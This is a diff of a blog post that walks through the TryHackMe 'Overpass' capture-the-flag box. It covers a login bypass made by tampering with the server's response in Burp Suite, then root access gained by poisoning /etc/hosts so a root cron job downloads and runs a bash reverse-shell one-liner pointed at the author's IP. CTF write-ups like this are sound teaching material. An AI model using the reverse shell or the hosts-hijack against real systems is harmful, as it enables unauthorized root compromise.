@@ -56,7 +56,7 @@ Now no clue on credentials ,also bruteforcing is not the solution as mentioned i
 
 So just enumerating the files assoiated with the sourcecode shows us an interseting file named login.js which contain the function used in login form on the /admin page.
 
-![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/login.png)
+![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/logincode.png)
 
 The function login() in the box is the vulnerable code that will let us bypass the login form. The variable creds takes the credentials and variable response sends them to /api/login for validation and the statusOrCookie variable takes the response. Till here everything seems perfect now in the Conditional statement it checks if the response form the server is "Incorrect Credentials" then it will not allow access otherwise it will set a cookie named "SessionToken" to statusOrCookie and redirect us to admin panel. Here lies the vulnerability as user can change the response of /api/login from "Incorrect Credentials" to anything else using BurpSuite and trick the server to run the else part of the code.<br>Lets see practically:-
 <br>Intercepting request using burp:
@@ -128,17 +128,25 @@ User root is connecting to a URL using curl, moving down to check more to result
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/etc.png)
 
-Since curl is used by root so if we somehow exploit it we can get the root access.
+Since curl is used by root so if we somehow exploit it we can get the root access.The curl command from cronjob is using a "overpass.thm" as hostname and we have write access to the hosts file. Meaning we can replace the hostname to make the cronjob think that the hostname is from our IP Address which will let it connect to our given IP address.
 
-
-![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/python_server_mistake.png)
+Lets do this practically:
 
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/python_server.png)
 
+```
+	1. We need to start a python server locally using "python3 -m http.server 80" choose port 80 as it is the default port.
+	2. Make the same directory as "/downloads/src/buildscript.sh" 
+	3. Finally a file named buildscript.sh with the reverse shell , i used it from pentestermonkey.net "bash -i >& /dev/tcp/10.9.19.190/1234 0>&1"
+	4.Now start a netcat listener locally to which the Box will connect.
+	5. At last replace the IP of the /etc/hosts of overpass.thm to our own connecting IP.
+	6. All done now wait a few seconds till it connects back to us via nc listner due to cronjob assigned.
+
+```
+
 ![Overpass]({{ site.baseurl }}https://jaiguptanick.github.io/Blog/images/overpass/flag2.png)
 
-<!-- Box -->
-	
+Finally we got a connection from the Box as ROOT
 
 
 
